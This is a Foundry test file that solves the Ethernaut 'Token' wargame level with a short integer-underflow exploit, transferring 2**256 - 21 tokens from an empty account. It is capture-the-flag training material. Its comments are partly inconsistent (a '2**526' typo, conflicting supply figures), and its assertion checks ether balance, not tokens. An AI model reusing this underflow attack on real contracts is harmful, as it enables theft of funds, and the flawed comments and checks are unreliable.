// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Token/TokenFactory.sol";
import "../src/Ethernaut.sol";

contract TokenTest is Test {
    Ethernaut ethernaut;
    address player = address(100);
    address player2 = address(200);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testTokenHack() public {
        /****************
         * Factory setup *
         *************** */
        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token ethernautToken = Token(payable(levelAddress)); // 1000 is initial supply
        vm.stopPrank();
        /****************
         *    Attack     *
         *************** */
        /*
         * Walkthrough:
         * For this level we can use 2 addresses
         * default _initialSupply is set to 20
         * we want to transfer an amount of token  2**526 causing overflow
         */
        // this level is a classic example of overflow, which is now prevented by default in Sol ^8.0.0
        vm.startPrank(player2);
        ethernautToken.transfer(player, 2**256 - 21);
        vm.stopPrank();
        vm.startPrank(player);
        assertEq(address(ethernautToken).balance, 0);

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
